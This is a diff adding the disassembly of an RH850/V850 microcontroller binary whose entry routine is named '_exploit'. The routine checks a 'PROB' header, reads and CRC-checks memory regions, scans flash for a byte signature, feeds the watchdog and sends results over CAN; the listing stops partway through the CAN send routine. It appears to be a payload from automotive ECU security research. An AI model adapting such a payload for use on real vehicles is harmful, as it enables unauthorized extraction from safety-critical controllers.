@@ -1,0 +1,613 @@
+
+build/deep_probe.elf:     file format elf32-v850-rh850
+
+
+Disassembly of section .text.entry:
+
+febf0000 <_exploit>:
+febf0000:	03 1e d0 ff 	addi	-48, sp, sp
+febf0004:	63 ff 2d 00 	st.w	lp, 44[sp]
+febf0008:	63 17 29 00 	st.w	r2, 40[sp]
+febf000c:	63 a7 25 00 	st.w	r20, 36[sp]
+febf0010:	63 af 21 00 	st.w	r21, 32[sp]
+febf0014:	63 b7 1d 00 	st.w	r22, 28[sp]
+febf0018:	63 bf 19 00 	st.w	r23, 24[sp]
+febf001c:	63 c7 15 00 	st.w	r24, 20[sp]
+febf0020:	63 cf 11 00 	st.w	r25, 16[sp]
+febf0024:	63 d7 0d 00 	st.w	r26, 12[sp]
+febf0028:	63 df 09 00 	st.w	r27, 8[sp]
+febf002c:	63 e7 05 00 	st.w	r28, 4[sp]
+febf0030:	63 ef 01 00 	st.w	r29, 0[sp]
+febf0034:	03 1e e0 ff 	addi	-32, sp, sp
+febf0038:	e0 07 60 01 	di	
+febf003c:	40 ee bf fe 	movhi	-321, r0, r29
+febf0040:	63 07 19 00 	st.w	r0, 24[sp]
+febf0044:	3d ee 88 11 	movea	4488, r29, r29
+febf0048:	3d 57 01 00 	ld.w	0[r29], r10
+febf004c:	60 52       	cmp	0, r10
+febf004e:	b2 45       	be	febf00d4 <_exploit+0xd4>
+febf0050:	3d 57 01 00 	ld.w	0[r29], r10
+febf0054:	7f 52       	cmp	-1, r10
+febf0056:	f2 3d       	be	febf00d4 <_exploit+0xd4>
+febf0058:	01 52       	mov	1, r10
+febf005a:	43 57 1c 00 	st.b	r10, 28[sp]
+febf005e:	40 36 01 00 	movhi	1, r0, r6
+febf0062:	40 56 bf fe 	movhi	-321, r0, r10
+febf0066:	26 36 ff ff 	movea	-1, r6, r6
+febf006a:	2a 56 ac 11 	movea	4524, r10, r10
+febf006e:	80 ff 04 00 	jarl	febf0072 <_exploit+0x72>, lp
+febf0072:	44 fa       	add	4, lp
+febf0074:	6a 00       	jmp	[r10]
+febf0076:	40 36 bf fe 	movhi	-321, r0, r6
+febf007a:	26 36 2c 10 	movea	4140, r6, r6
+febf007e:	63 57 19 00 	st.w	r10, 24[sp]
+febf0082:	01 ca       	mov	1, r25
+febf0084:	80 ff 04 00 	jarl	febf0088 <_exploit+0x88>, lp
+febf0088:	44 fa       	add	4, lp
+febf008a:	7d 00       	jmp	[r29]
+febf008c:	40 5e bf fe 	movhi	-321, r0, r11
+febf0090:	2b 5e 00 0f 	movea	3840, r11, r11
+febf0094:	0b 67 01 00 	ld.b	1[r11], r12
+febf0098:	0b 57 00 00 	ld.b	0[r11], r10
+febf009c:	cc 66 ff 00 	andi	255, r12, r12
+febf00a0:	d0 62       	shl	16, r12
+febf00a2:	d8 52       	shl	24, r10
+febf00a4:	0c 51       	or	r12, r10
+febf00a6:	0b 67 03 00 	ld.b	3[r11], r12
+febf00aa:	0b 5f 02 00 	ld.b	2[r11], r11
+febf00ae:	cc 66 ff 00 	andi	255, r12, r12
+febf00b2:	cb 5e ff 00 	andi	255, r11, r11
+febf00b6:	c8 5a       	shl	8, r11
+febf00b8:	0c 51       	or	r12, r10
+febf00ba:	0b 51       	or	r11, r10
+febf00bc:	40 5e 52 50 	movhi	20562, r0, r11
+febf00c0:	2b 5e 42 4f 	movea	20290, r11, r11
+febf00c4:	eb 51       	cmp	r11, r10
+febf00c6:	b2 0d       	be	febf00dc <_exploit+0xdc>
+febf00c8:	03 46 18 00 	addi	24, sp, r8
+febf00cc:	01 3a       	mov	1, r7
+febf00ce:	00 32       	mov	0, r6
+febf00d0:	80 ff d8 05 	jarl	febf06a8 <_halt_with_error>, lp
+febf00d4:	00 ca       	mov	0, r25
+febf00d6:	43 07 1c 00 	st.b	r0, 28[sp]
+febf00da:	95 dd       	br	febf008c <_exploit+0x8c>
+febf00dc:	40 56 bf fe 	movhi	-321, r0, r10
+febf00e0:	2a 56 04 0f 	movea	3844, r10, r10
+febf00e4:	0a d7 00 00 	ld.b	0[r10], r26
+febf00e8:	da b6 ff 00 	andi	255, r26, r22
+febf00ec:	da d6 01 00 	andi	1, r26, r26
+febf00f0:	60 d2       	cmp	0, r26
+febf00f2:	ea 3d       	bne	febf016e <_exploit+0x16e>
+febf00f4:	02 e2       	mov	2, r28
+febf00f6:	40 56 bf fe 	movhi	-321, r0, r10
+febf00fa:	2a 56 05 0f 	movea	3845, r10, r10
+febf00fe:	0a af 00 00 	ld.b	0[r10], r21
+febf0102:	40 5e bf fe 	movhi	-321, r0, r11
+febf0106:	d5 ae ff 00 	andi	255, r21, r21
+febf010a:	2b 5e 06 0f 	movea	3846, r11, r11
+febf010e:	00 6a       	mov	0, r13
+febf0110:	a5 15       	br	febf0134 <_exploit+0x134>
+febf0112:	2b 67 04 00 	ld.h	4[r11], r12
+febf0116:	43 e2       	add	3, r28
+febf0118:	0c 50       	mov	r12, r10
+febf011a:	cc 66 ff ff 	andi	65535, r12, r12
+febf011e:	c8 52       	shl	8, r10
+febf0120:	88 62       	shr	8, r12
+febf0122:	0c 51       	or	r12, r10
+febf0124:	ca 56 ff ff 	andi	65535, r10, r10
+febf0128:	82 52       	shr	2, r10
+febf012a:	41 6a       	add	1, r13
+febf012c:	ca e1       	add	r10, r28
+febf012e:	cd 6e ff 00 	andi	255, r13, r13
+febf0132:	4a 5a       	add	10, r11
+febf0134:	f5 69       	cmp	r21, r13
+febf0136:	ea ed       	bne	febf0112 <_exploit+0x112>
+febf0138:	d6 56 02 00 	andi	2, r22, r10
+febf013c:	60 52       	cmp	0, r10
+febf013e:	63 57 01 00 	st.w	r10, 0[sp]
+febf0142:	40 ee bf fe 	movhi	-321, r0, r29
+febf0146:	ea 57 00 00 	setf	nz, r10
+febf014a:	03 16 18 00 	addi	24, sp, r2
+febf014e:	02 40       	mov	r2, r8
+febf0150:	00 3a       	mov	0, r7
+febf0152:	20 36 b0 01 	movea	432, r0, r6
+febf0156:	3d ee 7e 05 	movea	1406, r29, r29
+febf015a:	ca e1       	add	r10, r28
+febf015c:	80 ff 04 00 	jarl	febf0160 <_exploit+0x160>, lp
+febf0160:	44 fa       	add	4, lp
+febf0162:	7d 00       	jmp	[r29]
+febf0164:	60 52       	cmp	0, r10
+febf0166:	02 40       	mov	r2, r8
+febf0168:	e2 05       	be	febf0174 <_exploit+0x174>
+febf016a:	02 3a       	mov	2, r7
+febf016c:	95 b5       	br	febf00ce <_exploit+0xce>
+febf016e:	20 e6 1b 00 	movea	27, r0, r28
+febf0172:	a5 c5       	br	febf00f6 <_exploit+0xf6>
+febf0174:	1c 3e 02 00 	addi	2, r28, r7
+febf0178:	20 36 b1 01 	movea	433, r0, r6
+febf017c:	80 ff 04 00 	jarl	febf0180 <_exploit+0x180>, lp
+febf0180:	44 fa       	add	4, lp
+febf0182:	7d 00       	jmp	[r29]
+febf0184:	60 52       	cmp	0, r10
+febf0186:	c2 05       	be	febf018e <_exploit+0x18e>
+febf0188:	02 40       	mov	r2, r8
+febf018a:	03 3a       	mov	3, r7
+febf018c:	95 a5       	br	febf00ce <_exploit+0xce>
+febf018e:	60 d2       	cmp	0, r26
+febf0190:	ba 05       	bne	febf0196 <_exploit+0x196>
+febf0192:	80 07 fe 02 	jr	febf0490 <_exploit+0x490>
+febf0196:	40 66 bf fe 	movhi	-321, r0, r12
+febf019a:	40 d6 bf fe 	movhi	-321, r0, r26
+febf019e:	40 c6 bf fe 	movhi	-321, r0, r24
+febf01a2:	2c de e4 06 	movea	1764, r12, r27
+febf01a6:	00 b2       	mov	0, r22
+febf01a8:	1f e2       	mov	-1, r28
+febf01aa:	3a d6 ee 04 	movea	1262, r26, r26
+febf01ae:	38 c6 56 05 	movea	1366, r24, r24
+febf01b2:	20 a6 19 00 	movea	25, r0, r20
+febf01b6:	1b 57 04 00 	ld.b	4[r27], r10
+febf01ba:	d6 be ff ff 	andi	65535, r22, r23
+febf01be:	ca 56 ff 00 	andi	255, r10, r10
+febf01c2:	61 52       	cmp	1, r10
+febf01c4:	3b 5f 01 00 	ld.w	0[r27], r11
+febf01c8:	e2 05       	be	febf01d4 <_exploit+0x1d4>
+febf01ca:	62 52       	cmp	2, r10
+febf01cc:	d2 4d       	be	febf0266 <_exploit+0x266>
+febf01ce:	2b 5f 01 00 	ld.w	0[r11], r11
+febf01d2:	d5 05       	br	febf01dc <_exploit+0x1dc>
+febf01d4:	0b 5f 00 00 	ld.b	0[r11], r11
+febf01d8:	cb 5e ff 00 	andi	255, r11, r11
+febf01dc:	00 72       	mov	0, r14
+febf01de:	0b 38       	mov	r11, r7
+febf01e0:	ee 3f 80 00 	shr	r14, r7
+febf01e4:	c7 3e ff 00 	andi	255, r7, r7
+febf01e8:	1c 30       	mov	r28, r6
+febf01ea:	63 5f 09 00 	st.w	r11, 8[sp]
+febf01ee:	63 77 05 00 	st.w	r14, 4[sp]
+febf01f2:	80 ff 04 00 	jarl	febf01f6 <_exploit+0x1f6>, lp
+febf01f6:	44 fa       	add	4, lp
+febf01f8:	7a 00       	jmp	[r26]
+febf01fa:	23 77 05 00 	ld.w	4[sp], r14
+febf01fe:	0a e0       	mov	r10, r28
+febf0200:	48 72       	add	8, r14
+febf0202:	20 56 20 00 	movea	32, r0, r10
+febf0206:	ea 71       	cmp	r10, r14
+febf0208:	23 5f 09 00 	ld.w	8[sp], r11
+febf020c:	9a ed       	bne	febf01de <_exploit+0x1de>
+febf020e:	16 30       	mov	r22, r6
+febf0210:	d0 32       	shl	16, r6
+febf0212:	86 36 b2 01 	ori	434, r6, r6
+febf0216:	02 40       	mov	r2, r8
+febf0218:	0b 38       	mov	r11, r7
+febf021a:	80 ff 04 00 	jarl	febf021e <_exploit+0x21e>, lp
+febf021e:	44 fa       	add	4, lp
+febf0220:	7d 00       	jmp	[r29]
+febf0222:	60 52       	cmp	0, r10
+febf0224:	b2 05       	be	febf022a <_exploit+0x22a>
+febf0226:	80 07 be 02 	jr	febf04e4 <_exploit+0x4e4>
+febf022a:	d7 be 07 00 	andi	7, r23, r23
+febf022e:	60 ba       	cmp	0, r23
+febf0230:	ea 05       	bne	febf023c <_exploit+0x23c>
+febf0232:	19 30       	mov	r25, r6
+febf0234:	80 ff 04 00 	jarl	febf0238 <_exploit+0x238>, lp
+febf0238:	44 fa       	add	4, lp
+febf023a:	78 00       	jmp	[r24]
+febf023c:	41 b2       	add	1, r22
+febf023e:	48 da       	add	8, r27
+febf0240:	f4 b1       	cmp	r20, r22
+febf0242:	aa bd       	bne	febf01b6 <_exploit+0x1b6>
+febf0244:	40 56 bf fe 	movhi	-321, r0, r10
+febf0248:	2a b6 06 0f 	movea	3846, r10, r22
+febf024c:	40 56 bf fe 	movhi	-321, r0, r10
+febf0250:	40 a6 bf fe 	movhi	-321, r0, r20
+febf0254:	2a 56 56 05 	movea	1366, r10, r10
+febf0258:	00 c2       	mov	0, r24
+febf025a:	34 a6 ee 04 	movea	1262, r20, r20
+febf025e:	63 57 09 00 	st.w	r10, 8[sp]
+febf0262:	80 07 3a 01 	jr	febf039c <_exploit+0x39c>
+febf0266:	2b 5f 00 00 	ld.h	0[r11], r11
+febf026a:	cb 5e ff ff 	andi	65535, r11, r11
+febf026e:	f5 b5       	br	febf01dc <_exploit+0x1dc>
+febf0270:	16 57 01 00 	ld.b	1[r22], r10
+febf0274:	16 df 00 00 	ld.b	0[r22], r27
+febf0278:	ca 56 ff 00 	andi	255, r10, r10
+febf027c:	d0 52       	shl	16, r10
+febf027e:	d8 da       	shl	24, r27
+febf0280:	0a d9       	or	r10, r27
+febf0282:	16 57 03 00 	ld.b	3[r22], r10
+febf0286:	02 40       	mov	r2, r8
+febf0288:	ca 56 ff 00 	andi	255, r10, r10
+febf028c:	0a d9       	or	r10, r27
+febf028e:	16 57 02 00 	ld.b	2[r22], r10
+febf0292:	20 36 b3 01 	movea	435, r0, r6
+febf0296:	ca 56 ff 00 	andi	255, r10, r10
+febf029a:	c8 52       	shl	8, r10
+febf029c:	0a d9       	or	r10, r27
+febf029e:	1b 38       	mov	r27, r7
+febf02a0:	36 bf 04 00 	ld.h	4[r22], r23
+febf02a4:	80 ff 04 00 	jarl	febf02a8 <_exploit+0x2a8>, lp
+febf02a8:	44 fa       	add	4, lp
+febf02aa:	7d 00       	jmp	[r29]
+febf02ac:	60 52       	cmp	0, r10
+febf02ae:	8a 75       	bne	febf038e <_exploit+0x38e>
+febf02b0:	17 d0       	mov	r23, r26
+febf02b2:	d7 be ff ff 	andi	65535, r23, r23
+febf02b6:	c8 d2       	shl	8, r26
+febf02b8:	88 ba       	shr	8, r23
+febf02ba:	17 d1       	or	r23, r26
+febf02bc:	da 56 ff ff 	andi	65535, r26, r10
+febf02c0:	02 40       	mov	r2, r8
+febf02c2:	0a 38       	mov	r10, r7
+febf02c4:	20 36 b4 01 	movea	436, r0, r6
+febf02c8:	63 57 05 00 	st.w	r10, 4[sp]
+febf02cc:	80 ff 04 00 	jarl	febf02d0 <_exploit+0x2d0>, lp
+febf02d0:	44 fa       	add	4, lp
+febf02d2:	7d 00       	jmp	[r29]
+febf02d4:	60 52       	cmp	0, r10
+febf02d6:	ea 5d       	bne	febf0392 <_exploit+0x392>
+febf02d8:	1f ba       	mov	-1, r23
+febf02da:	00 d2       	mov	0, r26
+febf02dc:	23 57 05 00 	ld.w	4[sp], r10
+febf02e0:	fa 51       	cmp	r26, r10
+febf02e2:	cb 15       	bh	febf030a <_exploit+0x30a>
+febf02e4:	37 38       	not	r23, r7
+febf02e6:	02 40       	mov	r2, r8
+febf02e8:	20 36 b5 01 	movea	437, r0, r6
+febf02ec:	80 ff 04 00 	jarl	febf02f0 <_exploit+0x2f0>, lp
+febf02f0:	44 fa       	add	4, lp
+febf02f2:	7d 00       	jmp	[r29]
+febf02f4:	60 52       	cmp	0, r10
+febf02f6:	ea 3f 00 00 	setf	nz, r7
+febf02fa:	c2 3a       	shl	2, r7
+febf02fc:	4a b2       	add	10, r22
+febf02fe:	60 3a       	cmp	0, r7
+febf0300:	b2 4d       	be	febf0396 <_exploit+0x396>
+febf0302:	02 40       	mov	r2, r8
+febf0304:	02 32       	mov	2, r6
+febf0306:	bf 07 ca fd 	jr	febf00d0 <_exploit+0xd0>
+febf030a:	1a 50       	mov	r26, r10
+febf030c:	db 51       	add	r27, r10
+febf030e:	2a 77 01 00 	ld.w	0[r10], r14
+febf0312:	00 6a       	mov	0, r13
+febf0314:	0e 38       	mov	r14, r7
+febf0316:	ed 3f 80 00 	shr	r13, r7
+febf031a:	c7 3e ff 00 	andi	255, r7, r7
+febf031e:	17 30       	mov	r23, r6
+febf0320:	63 77 15 00 	st.w	r14, 20[sp]
+febf0324:	63 6f 11 00 	st.w	r13, 16[sp]
+febf0328:	63 3f 0d 00 	st.w	r7, 12[sp]
+febf032c:	80 ff 04 00 	jarl	febf0330 <_exploit+0x330>, lp
+febf0330:	44 fa       	add	4, lp
+febf0332:	74 00       	jmp	[r20]
+febf0334:	23 3f 0d 00 	ld.w	12[sp], r7
+febf0338:	1c 30       	mov	r28, r6
+febf033a:	0a b8       	mov	r10, r23
+febf033c:	80 ff 04 00 	jarl	febf0340 <_exploit+0x340>, lp
+febf0340:	44 fa       	add	4, lp
+febf0342:	74 00       	jmp	[r20]
+febf0344:	23 6f 11 00 	ld.w	16[sp], r13
+febf0348:	0a e0       	mov	r10, r28
+febf034a:	48 6a       	add	8, r13
+febf034c:	20 56 20 00 	movea	32, r0, r10
+febf0350:	ea 69       	cmp	r10, r13
+febf0352:	23 77 15 00 	ld.w	20[sp], r14
+febf0356:	fa dd       	bne	febf0314 <_exploit+0x314>
+febf0358:	1a 30       	mov	r26, r6
+febf035a:	ce 32       	shl	14, r6
+febf035c:	86 36 d0 01 	ori	464, r6, r6
+febf0360:	02 40       	mov	r2, r8
+febf0362:	0e 38       	mov	r14, r7
+febf0364:	80 ff 04 00 	jarl	febf0368 <_exploit+0x368>, lp
+febf0368:	44 fa       	add	4, lp
+febf036a:	7d 00       	jmp	[r29]
+febf036c:	60 52       	cmp	0, r10
+febf036e:	ea 0d       	bne	febf038a <_exploit+0x38a>
+febf0370:	da 56 ff 07 	andi	2047, r26, r10
+febf0374:	60 52       	cmp	0, r10
+febf0376:	8a 0d       	bne	febf0386 <_exploit+0x386>
+febf0378:	23 57 09 00 	ld.w	8[sp], r10
+febf037c:	19 30       	mov	r25, r6
+febf037e:	80 ff 04 00 	jarl	febf0382 <_exploit+0x382>, lp
+febf0382:	44 fa       	add	4, lp
+febf0384:	6a 00       	jmp	[r10]
+febf0386:	44 d2       	add	4, r26
+febf0388:	a5 ad       	br	febf02dc <_exploit+0x2dc>
+febf038a:	03 3a       	mov	3, r7
+febf038c:	85 bd       	br	febf02fc <_exploit+0x2fc>
+febf038e:	01 3a       	mov	1, r7
+febf0390:	95 bd       	br	febf0302 <_exploit+0x302>
+febf0392:	02 3a       	mov	2, r7
+febf0394:	f5 b5       	br	febf0302 <_exploit+0x302>
+febf0396:	41 c2       	add	1, r24
+febf0398:	d8 c6 ff 00 	andi	255, r24, r24
+febf039c:	f5 c1       	cmp	r21, r24
+febf039e:	b2 05       	be	febf03a4 <_exploit+0x3a4>
+febf03a0:	bf 07 d0 fe 	jr	febf0270 <_exploit+0x270>
+febf03a4:	23 57 01 00 	ld.w	0[sp], r10
+febf03a8:	60 52       	cmp	0, r10
+febf03aa:	e2 75       	be	febf0496 <_exploit+0x496>
+febf03ac:	40 de 02 00 	movhi	2, r0, r27
+febf03b0:	40 be bf fe 	movhi	-321, r0, r23
+febf03b4:	40 c6 10 00 	movhi	16, r0, r24
+febf03b8:	00 d2       	mov	0, r26
+febf03ba:	3b de 00 80 	movea	-32768, r27, r27
+febf03be:	20 b6 e0 00 	movea	224, r0, r22
+febf03c2:	20 ae d1 00 	movea	209, r0, r21
+febf03c6:	37 be 56 05 	movea	1366, r23, r23
+febf03ca:	38 c6 f9 fd 	movea	-519, r24, r24
+febf03ce:	1b 57 00 00 	ld.b	0[r27], r10
+febf03d2:	1b 38       	mov	r27, r7
+febf03d4:	ca 56 ff 00 	andi	255, r10, r10
+febf03d8:	1b a0       	mov	r27, r20
+febf03da:	41 da       	add	1, r27
+febf03dc:	f6 51       	cmp	r22, r10
+febf03de:	fa 3d       	bne	febf045c <_exploit+0x45c>
+febf03e0:	1b 57 00 00 	ld.b	0[r27], r10
+febf03e4:	ca 56 ff 00 	andi	255, r10, r10
+febf03e8:	f5 51       	cmp	r21, r10
+febf03ea:	9a 3d       	bne	febf045c <_exploit+0x45c>
+febf03ec:	07 57 02 00 	ld.b	2[r7], r10
+febf03f0:	20 5e 9a 00 	movea	154, r0, r11
+febf03f4:	ca 56 ff 00 	andi	255, r10, r10
+febf03f8:	eb 51       	cmp	r11, r10
+febf03fa:	9a 35       	bne	febf045c <_exploit+0x45c>
+febf03fc:	07 57 03 00 	ld.b	3[r7], r10
+febf0400:	ca 56 ff 00 	andi	255, r10, r10
+febf0404:	6d 52       	cmp	13, r10
+febf0406:	ba 2d       	bne	febf045c <_exploit+0x45c>
+febf0408:	07 57 04 00 	ld.b	4[r7], r10
+febf040c:	20 5e 1a 00 	movea	26, r0, r11
+febf0410:	ca 56 ff 00 	andi	255, r10, r10
+febf0414:	eb 51       	cmp	r11, r10
+febf0416:	ba 25       	bne	febf045c <_exploit+0x45c>
+febf0418:	07 57 05 00 	ld.b	5[r7], r10
+febf041c:	20 5e 38 00 	movea	56, r0, r11
+febf0420:	ca 56 ff 00 	andi	255, r10, r10
+febf0424:	eb 51       	cmp	r11, r10
+febf0426:	ba 1d       	bne	febf045c <_exploit+0x45c>
+febf0428:	07 57 06 00 	ld.b	6[r7], r10
+febf042c:	20 5e bf 00 	movea	191, r0, r11
+febf0430:	ca 56 ff 00 	andi	255, r10, r10
+febf0434:	eb 51       	cmp	r11, r10
+febf0436:	ba 15       	bne	febf045c <_exploit+0x45c>
+febf0438:	07 57 07 00 	ld.b	7[r7], r10
+febf043c:	20 5e ff 00 	movea	255, r0, r11
+febf0440:	ca 56 ff 00 	andi	255, r10, r10
+febf0444:	eb 51       	cmp	r11, r10
+febf0446:	ba 0d       	bne	febf045c <_exploit+0x45c>
+febf0448:	02 40       	mov	r2, r8
+febf044a:	20 36 c1 01 	movea	449, r0, r6
+febf044e:	80 ff 04 00 	jarl	febf0452 <_exploit+0x452>, lp
+febf0452:	44 fa       	add	4, lp
+febf0454:	7d 00       	jmp	[r29]
+febf0456:	60 52       	cmp	0, r10
+febf0458:	fa 15       	bne	febf0486 <_exploit+0x486>
+febf045a:	41 d2       	add	1, r26
+febf045c:	d4 a6 ff 7f 	andi	32767, r20, r20
+febf0460:	60 a2       	cmp	0, r20
+febf0462:	ea 05       	bne	febf046e <_exploit+0x46e>
+febf0464:	19 30       	mov	r25, r6
+febf0466:	80 ff 04 00 	jarl	febf046a <_exploit+0x46a>, lp
+febf046a:	44 fa       	add	4, lp
+febf046c:	77 00       	jmp	[r23]
+febf046e:	f8 d9       	cmp	r24, r27
+febf0470:	fa ad       	bne	febf03ce <_exploit+0x3ce>
+febf0472:	02 40       	mov	r2, r8
+febf0474:	1a 38       	mov	r26, r7
+febf0476:	20 36 c2 01 	movea	450, r0, r6
+febf047a:	80 ff 04 00 	jarl	febf047e <_exploit+0x47e>, lp
+febf047e:	44 fa       	add	4, lp
+febf0480:	7d 00       	jmp	[r29]
+febf0482:	60 52       	cmp	0, r10
+febf0484:	92 0d       	be	febf0496 <_exploit+0x496>
+febf0486:	02 40       	mov	r2, r8
+febf0488:	01 3a       	mov	1, r7
+febf048a:	03 32       	mov	3, r6
+febf048c:	bf 07 44 fc 	jr	febf00d0 <_exploit+0xd0>
+febf0490:	1f e2       	mov	-1, r28
+febf0492:	bf 07 b2 fd 	jr	febf0244 <_exploit+0x244>
+febf0496:	02 40       	mov	r2, r8
+febf0498:	01 3a       	mov	1, r7
+febf049a:	20 36 c0 01 	movea	448, r0, r6
+febf049e:	80 ff 04 00 	jarl	febf04a2 <_exploit+0x4a2>, lp
+febf04a2:	44 fa       	add	4, lp
+febf04a4:	7d 00       	jmp	[r29]
+febf04a6:	60 52       	cmp	0, r10
+febf04a8:	02 40       	mov	r2, r8
+febf04aa:	d2 05       	be	febf04b4 <_exploit+0x4b4>
+febf04ac:	01 3a       	mov	1, r7
+febf04ae:	04 32       	mov	4, r6
+febf04b0:	bf 07 20 fc 	jr	febf00d0 <_exploit+0xd0>
+febf04b4:	3c 38       	not	r28, r7
+febf04b6:	20 36 e0 01 	movea	480, r0, r6
+febf04ba:	80 ff 04 00 	jarl	febf04be <_exploit+0x4be>, lp
+febf04be:	44 fa       	add	4, lp
+febf04c0:	7d 00       	jmp	[r29]
+febf04c2:	60 52       	cmp	0, r10
+febf04c4:	c2 05       	be	febf04cc <_exploit+0x4cc>
+febf04c6:	02 40       	mov	r2, r8
+febf04c8:	02 3a       	mov	2, r7
+febf04ca:	a5 f5       	br	febf04ae <_exploit+0x4ae>
+febf04cc:	60 ca       	cmp	0, r25
+febf04ce:	c2 05       	be	febf04d6 <_exploit+0x4d6>
+febf04d0:	02 30       	mov	r2, r6
+febf04d2:	80 ff 46 00 	jarl	febf0518 <_runtime_end.part___0>, lp
+febf04d6:	20 56 7e 15 	movea	5502, r0, r10
+febf04da:	80 ff 04 00 	jarl	febf04de <_exploit+0x4de>, lp
+febf04de:	44 fa       	add	4, lp
+febf04e0:	6a 00       	jmp	[r10]
+febf04e2:	85 05       	br	febf04e2 <_exploit+0x4e2>
+febf04e4:	01 3a       	mov	1, r7
+febf04e6:	02 40       	mov	r2, r8
+febf04e8:	07 30       	mov	r7, r6
+febf04ea:	bf 07 e6 fb 	jr	febf00d0 <_exploit+0xd0>
+
+Disassembly of section .text:
+
+febf04ee <_crc32_update>:
+febf04ee:	c7 56 ff 00 	andi	255, r7, r10
+febf04f2:	26 51       	xor	r6, r10
+febf04f4:	08 5a       	mov	8, r11
+febf04f6:	0a 60       	mov	r10, r12
+febf04f8:	40 6e b9 ed 	movhi	-4679, r0, r13
+febf04fc:	ca 56 01 00 	andi	1, r10, r10
+febf0500:	80 51       	subr	r0, r10
+febf0502:	2d 6e 20 83 	movea	-31968, r13, r13
+febf0506:	81 62       	shr	1, r12
+febf0508:	4d 51       	and	r13, r10
+febf050a:	5f 5a       	add	-1, r11
+febf050c:	2c 51       	xor	r12, r10
+febf050e:	cb 5e ff 00 	andi	255, r11, r11
+febf0512:	60 5a       	cmp	0, r11
+febf0514:	9a f5       	bne	febf04f6 <_crc32_update+0x8>
+febf0516:	7f 00       	jmp	[lp]
+
+febf0518 <_runtime_end.part___0>:
+febf0518:	58 1a       	add	-8, sp
+febf051a:	40 56 bf fe 	movhi	-321, r0, r10
+febf051e:	63 ef 01 00 	st.w	r29, 0[sp]
+febf0522:	2a 56 88 11 	movea	4488, r10, r10
+febf0526:	06 e8       	mov	r6, r29
+febf0528:	00 32       	mov	0, r6
+febf052a:	63 ff 05 00 	st.w	lp, 4[sp]
+febf052e:	80 ff 04 00 	jarl	febf0532 <_runtime_end.part___0+0x1a>, lp
+febf0532:	44 fa       	add	4, lp
+febf0534:	6a 00       	jmp	[r10]
+febf0536:	3d 37 01 00 	ld.w	0[r29], r6
+febf053a:	40 56 bf fe 	movhi	-321, r0, r10
+febf053e:	2a 56 d2 11 	movea	4562, r10, r10
+febf0542:	80 ff 04 00 	jarl	febf0546 <_runtime_end.part___0+0x2e>, lp
+febf0546:	44 fa       	add	4, lp
+febf0548:	6a 00       	jmp	[r10]
+febf054a:	23 ff 05 00 	ld.w	4[sp], lp
+febf054e:	23 ef 01 00 	ld.w	0[sp], r29
+febf0552:	48 1a       	add	8, sp
+febf0554:	7f 00       	jmp	[lp]
+
+febf0556 <_feed_watchdog.isra___0>:
+febf0556:	5c 1a       	add	-4, sp
+febf0558:	c6 36 ff 00 	andi	255, r6, r6
+febf055c:	60 32       	cmp	0, r6
+febf055e:	63 ff 01 00 	st.w	lp, 0[sp]
+febf0562:	a2 0d       	be	febf0576 <_feed_watchdog.isra___0+0x20>
+febf0564:	40 56 bf fe 	movhi	-321, r0, r10
+febf0568:	00 32       	mov	0, r6
+febf056a:	2a 56 88 11 	movea	4488, r10, r10
+febf056e:	80 ff 04 00 	jarl	febf0572 <_feed_watchdog.isra___0+0x1c>, lp
+febf0572:	44 fa       	add	4, lp
+febf0574:	6a 00       	jmp	[r10]
+febf0576:	23 ff 01 00 	ld.w	0[sp], lp
+febf057a:	44 1a       	add	4, sp
+febf057c:	7f 00       	jmp	[lp]
+
+febf057e <_can_send>:
+febf057e:	03 1e e4 ff 	addi	-28, sp, sp
+febf0582:	63 c7 15 00 	st.w	r24, 20[sp]
+febf0586:	63 ef 01 00 	st.w	r29, 0[sp]
+febf058a:	40 c6 bf fe 	movhi	-321, r0, r24
+febf058e:	40 ee d2 ff 	movhi	-46, r0, r29
+febf0592:	63 cf 11 00 	st.w	r25, 16[sp]
+febf0596:	63 d7 0d 00 	st.w	r26, 12[sp]
+febf059a:	63 df 09 00 	st.w	r27, 8[sp]
+febf059e:	63 e7 05 00 	st.w	r28, 4[sp]
+febf05a2:	06 c8       	mov	r6, r25
+febf05a4:	07 d0       	mov	r7, r26
+febf05a6:	08 d8       	mov	r8, r27
+febf05a8:	40 e6 00 01 	movhi	256, r0, r28
+febf05ac:	3d ee e0 02 	movea	736, r29, r29
+febf05b0:	38 c6 56 05 	movea	1366, r24, r24
+febf05b4:	63 ff 19 00 	st.w	lp, 24[sp]
+febf05b8:	1d 57 00 00 	ld.b	0[r29], r10
+febf05bc:	ca 56 06 00 	andi	6, r10, r10
+febf05c0:	60 52       	cmp	0, r10
+febf05c2:	ba 55       	bne	febf0668 <_can_send+0xea>
+febf05c4:	40 56 d2 ff 	movhi	-46, r0, r10
+febf05c8:	2a 56 04 42 	movea	16900, r10, r10
+febf05cc:	40 5e 00 80 	movhi	-32768, r0, r11
+febf05d0:	6a 5f 01 00 	st.w	r11, 0[r10]
+febf05d4:	40 56 d2 ff 	movhi	-46, r0, r10
+febf05d8:	2a 56 00 42 	movea	16896, r10, r10
+febf05dc:	20 5e a9 07 	movea	1961, r0, r11
+febf05e0:	6a 5f 01 00 	st.w	r11, 0[r10]
+febf05e4:	40 56 d2 ff 	movhi	-46, r0, r10
+febf05e8:	2a 56 0c 42 	movea	16908, r10, r10
+febf05ec:	6a cf 01 00 	st.w	r25, 0[r10]
+febf05f0:	40 56 d2 ff 	movhi	-46, r0, r10
+febf05f4:	2a 56 10 42 	movea	16912, r10, r10
+febf05f8:	6a d7 01 00 	st.w	r26, 0[r10]
+febf05fc:	40 56 d2 ff 	movhi	-46, r0, r10
+febf0600:	2a 56 08 42 	movea	16904, r10, r10
+febf0604:	40 5e d2 ff 	movhi	-46, r0, r11
+febf0608:	6a 07 01 00 	st.w	r0, 0[r10]
+febf060c:	2b 5e 60 02 	movea	608, r11, r11
+febf0610:	0b 57 00 00 	ld.b	0[r11], r10
+febf0614:	40 d6 bf fe 	movhi	-321, r0, r26
+febf0618:	ca 56 ff 00 	andi	255, r10, r10
+febf061c:	8a 56 01 00 	ori	1, r10, r10
+febf0620:	40 e6 00 01 	movhi	256, r0, r28
+febf0624:	3a d6 56 05 	movea	1366, r26, r26
+febf0628:	4b 57 00 00 	st.b	r10, 0[r11]
+febf062c:	1d 57 00 00 	ld.b	0[r29], r10
+febf0630:	ca 56 06 00 	andi	6, r10, r10
+febf0634:	60 52       	cmp	0, r10
+febf0636:	f2 25       	be	febf0684 <_can_send+0x106>
+febf0638:	1d 57 00 00 	ld.b	0[r29], r10
+febf063c:	ca 56 f9 00 	andi	249, r10, r10
+febf0640:	5d 57 00 00 	st.b	r10, 0[r29]
